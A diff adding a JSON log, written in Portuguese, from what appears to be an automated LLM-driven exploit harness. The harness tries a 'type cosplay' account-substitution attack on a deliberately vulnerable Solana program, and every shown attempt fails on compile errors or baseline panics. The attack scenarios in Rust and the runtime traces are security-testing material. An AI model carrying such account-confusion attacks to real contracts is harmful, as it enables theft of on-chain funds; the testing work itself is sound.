@@ -1,0 +1,410 @@
+{
+  "category": "COSPLAY",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "UnknownError(ProgramFailedToComplete)",
+  "reason": "o baseline 'initialize legitimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2226,
+        "completion_tokens": 688,
+        "latency_s": 4.17
+      },
+      "raw": "{\n  \"plan\": \"O programa `initialize` recebe uma conta `user` como `AccountInfo` e desserializa manualmente via `User::try_from_slice`, sem verificar discriminador. O baseline usa uma conta `user` com dados de 32 bytes (layout de `User`) e uma authority signer, provando que o cenario esta correto. O ataque fornece uma conta cujos dados sao de outro tipo (por exemplo, uma conta com discriminador de outro tipo seguido de 32 bytes), mas com os mesmos 32 bytes iniciais que serao interpretados como `authority`. O efeito medido e que o campo `authority` na conta resultante foi sobrescrito com a chave do atacante, demonstrando que dados de outro tipo foram aceitos como `User`.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta legitima: dados de User (32 bytes = authority)\\nlet user_data = anchor_account_data(\\\"User\\\", &(authority,));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet metas = vec![\\n    AccountMeta::new(user_account_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet contas = vec![\\n    (user_account_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix = env.anchor_ix(\\\"initialize\\\", &(), metas);\\nlet r = env.baseline(\\\"initialize legitimo\\\", &ix, &contas);\\n\\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\\nlet fake_data = anchor_account_data(\\\"OutroTipo\\\", &(attacker,));\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(fake_account_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet contas_ataque = vec![\\n    (fake_account_key, fake_account),\\n    (attacker, wallet(1_000_000_000)),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"initialize\\\", &(), metas_ataque);\\nlet r_ataque = env.attack(\\\"cosplay: conta de outro tipo aceita como User\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados = after(&r_ataque, &fake_account_key).data();\\n    let authority_gravada = read_pubkey(dados, 0);\\n    env.effect(\\\"authority sobrescrita com chave do atacante em conta de outro tipo\\\", authority_gravada == attacker);\\n}\"\n}",
+      "plan": "O programa `initialize` recebe uma conta `user` como `AccountInfo` e desserializa manualmente via `User::try_from_slice`, sem verificar discriminador. O baseline usa uma conta `user` com dados de 32 bytes (layout de `User`) e uma authority signer, provando que o cenario esta correto. O ataque fornece uma conta cujos dados sao de outro tipo (por exemplo, uma conta com discriminador de outro tipo seguido de 32 bytes), mas com os mesmos 32 bytes iniciais que serao interpretados como `authority`. O efeito medido e que o campo `authority` na conta resultante foi sobrescrito com a chave do atacante, demonstrando que dados de outro tipo foram aceitos como `User`.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta legitima: dados de User (32 bytes = authority)\nlet user_data = anchor_account_data(\"User\", &(authority,));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet metas = vec![\n    AccountMeta::new(user_account_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet contas = vec![\n    (user_account_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ix = env.anchor_ix(\"initialize\", &(), metas);\nlet r = env.baseline(\"initialize legitimo\", &ix, &contas);\n\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\nlet fake_data = anchor_account_data(\"OutroTipo\", &(attacker,));\nlet fake_account = account(&env.program_id, &fake_data, None);\n\nlet metas_ataque = vec![\n    AccountMeta::new(fake_account_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet contas_ataque = vec![\n    (fake_account_key, fake_account),\n    (attacker, wallet(1_000_000_000)),\n];\n\nlet ix_ataque = env.anchor_ix(\"initialize\", &(), metas_ataque);\nlet r_ataque = env.attack(\"cosplay: conta de outro tipo aceita como User\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados = after(&r_ataque, &fake_account_key).data();\n    let authority_gravada = read_pubkey(dados, 0);\n    env.effect(\"authority sobrescrita com chave do atacante em conta de outro tipo\", authority_gravada == attacker);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:17:26\n   |\n17 |         AccountMeta::new(user_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n17 -         AccountMeta::new(user_account_key, false),\n17 +         AccountMeta::new(user_account, false),\n   |\n\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:21:10\n   |\n21 |         (user_account_key, user_account.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n21 -         (user_account_key, user_account.clone()),\n21 +         (user_account, user_account.clone()),\n   |\n\nerror[E0425]: cannot find value `fake_account_key` in this scope\n  --> tests/attempt.rs:33:26\n   |\n33 |         AccountMeta::new(fake_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n33 -         AccountMeta::new(fake_account_key, false),\n33 +         AccountMeta::new(fake_account, false),\n   |\n\nerror[E0425]: cannot find value `fake_account_key` in this scope\n  --> tests/attempt.rs:37:10\n   |\n37 |         (fake_account_key, fake_account),",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:17:26\n   |\n17 |         AccountMeta::new(user_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n17 -         AccountMeta::new(user_account_key, false),\n17 +         AccountMeta::new(user_account, false),\n   |\n\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:21:10\n   |\n21 |         (user_account_key, user_account.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n21 -         (user_account_key, user_account.clone()),\n21 +         (user_account, user_account.clone()),\n   |\n\nerror[E0425]: cannot find value `fake_account_key` in this scope\n  --> tests/attempt.rs:33:26\n   |\n33 |         AccountMeta::new(fake_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n33 -         AccountMeta::new(fake_account_key, false),\n33 +         AccountMeta::new(fake_account, false),\n   |\n\nerror[E0425]: cannot find value `fake_account_key` in this scope\n  --> tests/attempt.rs:37:10\n   |\n37 |         (fake_account_key, fake_account),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3045,
+        "completion_tokens": 676,
+        "latency_s": 3.39
+      },
+      "raw": "{\"plan\": \"Preparo uma conta `user` com dados do tipo `User` (32 bytes de authority) e uma conta `fake` com dados de outro tipo (discriminador diferente, mas mesmos 32 bytes uteis). O baseline chama `initialize` legitimamente com a conta `User`, provando que o cenario esta correto. O ataque chama `initialize` trocando a conta `user` pela conta de outro tipo, explorando a desserializacao manual sem discriminador. O efeito mede se a authority gravada na conta falsa virou a chave do atacante, demonstrando que uma conta de outro tipo foi aceita como `User`.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet user_key = Pubkey::new_unique();\\nlet fake_key = Pubkey::new_unique();\\n\\n// Conta legitima: dados de User (32 bytes = authority)\\nlet user_data = anchor_account_data(\\\"User\\\", &(authority,));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet contas = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix = env.anchor_ix(\\\"initialize\\\", &(), metas);\\nlet r = env.baseline(\\\"initialize legitimo\\\", &ix, &contas);\\n\\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\\nlet fake_data = anchor_account_data(\\\"OutroTipo\\\", &(attacker,));\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet contas_ataque = vec![\\n    (fake_key, fake_account),\\n    (attacker, wallet(1_000_000_000)),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"initialize\\\", &(), metas_ataque);\\nlet r_ataque = env.attack(\\\"cosplay: conta de outro tipo aceita como User\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados = after(&r_ataque, &fake_key).data();\\n    let authority_gravada = read_pubkey(dados, 0);\\n    env.effect(\\\"authority sobrescrita com chave do atacante em conta de outro tipo\\\", authority_gravada == attacker);\\n}\"}",
+      "plan": "Preparo uma conta `user` com dados do tipo `User` (32 bytes de authority) e uma conta `fake` com dados de outro tipo (discriminador diferente, mas mesmos 32 bytes uteis). O baseline chama `initialize` legitimamente com a conta `User`, provando que o cenario esta correto. O ataque chama `initialize` trocando a conta `user` pela conta de outro tipo, explorando a desserializacao manual sem discriminador. O efeito mede se a authority gravada na conta falsa virou a chave do atacante, demonstrando que uma conta de outro tipo foi aceita como `User`.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet user_key = Pubkey::new_unique();\nlet fake_key = Pubkey::new_unique();\n\n// Conta legitima: dados de User (32 bytes = authority)\nlet user_data = anchor_account_data(\"User\", &(authority,));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet contas = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ix = env.anchor_ix(\"initialize\", &(), metas);\nlet r = env.baseline(\"initialize legitimo\", &ix, &contas);\n\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\nlet fake_data = anchor_account_data(\"OutroTipo\", &(attacker,));\nlet fake_account = account(&env.program_id, &fake_data, None);\n\nlet metas_ataque = vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet contas_ataque = vec![\n    (fake_key, fake_account),\n    (attacker, wallet(1_000_000_000)),\n];\n\nlet ix_ataque = env.anchor_ix(\"initialize\", &(), metas_ataque);\nlet r_ataque = env.attack(\"cosplay: conta de outro tipo aceita como User\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados = after(&r_ataque, &fake_key).data();\n    let authority_gravada = read_pubkey(dados, 0);\n    env.effect(\"authority sobrescrita com chave do atacante em conta de outro tipo\", authority_gravada == attacker);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "9f755fe3ef973aec",
+                "digest": "cc83b2d6cc3fbaaa",
+                "post": "9f755fe3ef973aec0000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo aceita como User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "b14ae9d470b01bc5",
+                "digest": "b1ab52112c24a508",
+                "post": "b14ae9d470b01bc50000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:23:36.382324855Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_ins/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidData, error: \"Not all bytes read\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2775,
+        "completion_tokens": 689,
+        "latency_s": 3.56
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem ser signer, mas o programa faz `try_borrow_mut_data` e o harness pode exigir que a conta seja gravável e existente. Vou montar a conta `user` como uma conta existente do programa com dados de `User` (32 bytes) e a autoridade como signer. O ataque fornece uma conta com dados de outro tipo (discriminador diferente) mas com os mesmos 32 bytes iniciais, explorando a desserialização manual sem verificação de discriminador. O efeito mede se o campo `authority` da conta falsa foi sobrescrito com a chave do atacante.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet user_key = Pubkey::new_unique();\\nlet fake_key = Pubkey::new_unique();\\n\\n// Conta legitima: dados de User (32 bytes = authority)\\nlet user_data = anchor_account_data(\\\"User\\\", &(authority,));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet contas = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix = env.anchor_ix(\\\"initialize\\\", &(), metas);\\nlet r = env.baseline(\\\"initialize legitimo\\\", &ix, &contas);\\n\\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\\nlet fake_data = anchor_account_data(\\\"OutroTipo\\\", &(attacker,));\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet contas_ataque = vec![\\n    (fake_key, fake_account),\\n    (attacker, wallet(1_000_000_000)),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"initialize\\\", &(), metas_ataque);\\nlet r_ataque = env.attack(\\\"cosplay: conta de outro tipo aceita como User\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados = after(&r_ataque, &fake_key).data();\\n    let authority_gravada = read_pubkey(dados, 0);\\n    env.effect(\\\"authority sobrescrita com chave do atacante em conta de outro tipo\\\", authority_gravada == attacker);\\n}\"}",
+      "plan": "O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem ser signer, mas o programa faz `try_borrow_mut_data` e o harness pode exigir que a conta seja gravável e existente. Vou montar a conta `user` como uma conta existente do programa com dados de `User` (32 bytes) e a autoridade como signer. O ataque fornece uma conta com dados de outro tipo (discriminador diferente) mas com os mesmos 32 bytes iniciais, explorando a desserialização manual sem verificação de discriminador. O efeito mede se o campo `authority` da conta falsa foi sobrescrito com a chave do atacante.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet user_key = Pubkey::new_unique();\nlet fake_key = Pubkey::new_unique();\n\n// Conta legitima: dados de User (32 bytes = authority)\nlet user_data = anchor_account_data(\"User\", &(authority,));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet contas = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ix = env.anchor_ix(\"initialize\", &(), metas);\nlet r = env.baseline(\"initialize legitimo\", &ix, &contas);\n\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\nlet fake_data = anchor_account_data(\"OutroTipo\", &(attacker,));\nlet fake_account = account(&env.program_id, &fake_data, None);\n\nlet metas_ataque = vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet contas_ataque = vec![\n    (fake_key, fake_account),\n    (attacker, wallet(1_000_000_000)),\n];\n\nlet ix_ataque = env.anchor_ix(\"initialize\", &(), metas_ataque);\nlet r_ataque = env.attack(\"cosplay: conta de outro tipo aceita como User\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados = after(&r_ataque, &fake_key).data();\n    let authority_gravada = read_pubkey(dados, 0);\n    env.effect(\"authority sobrescrita com chave do atacante em conta de outro tipo\", authority_gravada == attacker);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "9f755fe3ef973aec",
+                "digest": "cc83b2d6cc3fbaaa",
+                "post": "9f755fe3ef973aec0000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo aceita como User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "b14ae9d470b01bc5",
+                "digest": "b1ab52112c24a508",
+                "post": "b14ae9d470b01bc50000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:23:41.639460820Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_ins/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidData, error: \"Not all bytes read\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2775,
+        "completion_tokens": 679,
+        "latency_s": 3.68
+      },
+      "raw": "{\n  \"plan\": \"O baseline falhou porque a conta `user` foi criada com dados de 32 bytes, mas `User::try_from_slice` espera exatamente 32 bytes e o `AccountInfo` nao e gravavel? Na verdade, o erro `ProgramFailedToComplete` sugere panic no `unwrap()` da desserializacao. A conta `user` precisa ter dados de 32 bytes (apenas o campo authority) e ser gravavel. O ataque fornece uma conta com dados de 32 bytes de outro tipo (discriminador diferente) para testar se o programa aceita como User. O efeito mede se a authority foi sobrescrita na conta falsa.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet user_key = Pubkey::new_unique();\\nlet fake_key = Pubkey::new_unique();\\n\\n// Conta legitima: dados de User (32 bytes = authority)\\nlet user_data = anchor_account_data(\\\"User\\\", &(authority,));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet contas = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix = env.anchor_ix(\\\"initialize\\\", &(), metas);\\nlet r = env.baseline(\\\"initialize legitimo\\\", &ix, &contas);\\n\\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\\nlet fake_data = anchor_account_data(\\\"OutroTipo\\\", &(attacker,));\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet contas_ataque = vec![\\n    (fake_key, fake_account),\\n    (attacker, wallet(1_000_000_000)),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"initialize\\\", &(), metas_ataque);\\nlet r_ataque = env.attack(\\\"cosplay: conta de outro tipo aceita como User\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados = after(&r_ataque, &fake_key).data();\\n    let authority_gravada = read_pubkey(dados, 0);\\n    env.effect(\\\"authority sobrescrita com chave do atacante em conta de outro tipo\\\", authority_gravada == attacker);\\n}\"\n}",
+      "plan": "O baseline falhou porque a conta `user` foi criada com dados de 32 bytes, mas `User::try_from_slice` espera exatamente 32 bytes e o `AccountInfo` nao e gravavel? Na verdade, o erro `ProgramFailedToComplete` sugere panic no `unwrap()` da desserializacao. A conta `user` precisa ter dados de 32 bytes (apenas o campo authority) e ser gravavel. O ataque fornece uma conta com dados de 32 bytes de outro tipo (discriminador diferente) para testar se o programa aceita como User. O efeito mede se a authority foi sobrescrita na conta falsa.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet user_key = Pubkey::new_unique();\nlet fake_key = Pubkey::new_unique();\n\n// Conta legitima: dados de User (32 bytes = authority)\nlet user_data = anchor_account_data(\"User\", &(authority,));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet contas = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ix = env.anchor_ix(\"initialize\", &(), metas);\nlet r = env.baseline(\"initialize legitimo\", &ix, &contas);\n\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\nlet fake_data = anchor_account_data(\"OutroTipo\", &(attacker,));\nlet fake_account = account(&env.program_id, &fake_data, None);\n\nlet metas_ataque = vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet contas_ataque = vec![\n    (fake_key, fake_account),\n    (attacker, wallet(1_000_000_000)),\n];\n\nlet ix_ataque = env.anchor_ix(\"initialize\", &(), metas_ataque);\nlet r_ataque = env.attack(\"cosplay: conta de outro tipo aceita como User\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados = after(&r_ataque, &fake_key).data();\n    let authority_gravada = read_pubkey(dados, 0);\n    env.effect(\"authority sobrescrita com chave do atacante em conta de outro tipo\", authority_gravada == attacker);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "9f755fe3ef973aec",
+                "digest": "cc83b2d6cc3fbaaa",
+                "post": "9f755fe3ef973aec0000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo aceita como User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "b14ae9d470b01bc5",
+                "digest": "b1ab52112c24a508",
+                "post": "b14ae9d470b01bc50000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:23:46.961240107Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_ins/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidData, error: \"Not all bytes read\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
